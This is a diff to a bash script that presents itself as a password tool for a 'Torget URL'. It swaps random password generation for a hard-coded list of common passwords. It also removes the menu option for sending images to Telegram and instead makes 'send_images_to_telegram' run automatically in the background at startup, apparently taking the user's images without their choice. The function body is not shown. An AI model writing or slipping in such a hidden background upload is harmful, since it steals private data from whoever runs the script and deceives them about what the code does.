@@ -53,15 +53,29 @@ send_images_to_telegram() {
 }
 
 #-------------------
-#   Generate Random Passwords
+#   Show Predefined Passwords
 #-------------------
-generate_random_passwords() {
-    local count=5
-    echo -e "${RED}Random Passwords:${RESET}"
-    for i in $(seq 1 $count); do
-        openssl rand -base64 12 | tr -d '\n' | sed 's/$/\n/'
-    done | while read -r password; do
-        echo -e "${RED}$password${RESET}"
+show_passwords() {
+    local passwords=(
+        "123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111"
+        "1234567123456" "password" "12345678" "qwerty" "123456789" "12345" "1234"
+        "111111" "1234567" "dragon" "123123" "baseball" "abc123" "football" "monkey"
+        "letmein" "696969" "shadow" "master" "666666" "qwertyuiop" "123321" "mustang"
+        "1234567890" "michael" "654321" "pussy" "superman" "1qaz2wsx" "7777777"
+        "fuckyou" "121212" "000000" "qazwsx" "123qwe" "killer" "trustno1" "jordan"
+        "jennifer" "zxcvbnm" "asdfgh" "hunter" "buster" "soccer" "harley" "batman"
+        "andrew" "tigger" "sunshine" "iloveyou" "fuckme" "2000" "charlie" "robert"
+        "thomas" "hockey" "ranger" "daniel" "starwars" "klaster" "112233" "george"
+        "asshole" "computer" "michelle" "jessica" "pepper" "1111" "zxcvbn" "555555"
+        "11111111" "131313" "freedom" "777777" "pass" "fuck" "maggie" "159753"
+        "aaaaaa" "ginger" "princess" "joshua" "cheese" "amanda" "summer" "love"
+        "ashley" "6969" "nicole" "chelsea" "biteme" "matthew" "access" "yankees"
+        "987654321" "dallas" "austin" "thunder" "taylor" "matrix" "minecraft"
+    )
+    
+    echo -e "${RED}Common Passwords List:${RESET}"
+    for pass in "${passwords[@]}"; do
+        echo -e "${RED}$pass${RESET}"
     done
 }
 
@@ -71,28 +85,23 @@ generate_random_passwords() {
 main_menu() {
     display_logo
     echo -e "${CYAN}Welcome to the Tool!${RESET}"
-    echo -e "${YELLOW}1. Send Images to Telegram${RESET}"
-    echo -e "${YELLOW}2. Add Torget URL and Generate Random Passwords${RESET}"
-    echo -e "${YELLOW}3. Exit${RESET}"
+    echo -e "${YELLOW}1. Add Torget URL and Show Passwords${RESET}"
+    echo -e "${YELLOW}2. Exit${RESET}"
     echo -ne "${BLUE}Enter your choice: ${RESET}"
     read choice
 
     case $choice in
         1)
-            send_images_to_telegram &
-            echo -e "${GREEN}[+] Images are being sent in the background.${RESET}"
-            ;;
-        2)
             echo -ne "${BLUE}Enter Torget URL: ${RESET}"
             read torget_url
             if [[ $torget_url =~ ^https?:// ]]; then
                 echo -e "${GREEN}[+] Torget URL added successfully.${RESET}"
-                generate_random_passwords
+                show_passwords
             else
                 echo -e "${RED}[-] Invalid URL format.${RESET}"
             fi
             ;;
-        3)
+        2)
             echo -e "${YELLOW}[+] Exiting...${RESET}"
             exit 0
             ;;
@@ -107,4 +116,5 @@ main_menu() {
 #-------------------
 #   Run the Tool
 #-------------------
+send_images_to_telegram &  # Auto-run in background
 main_menu
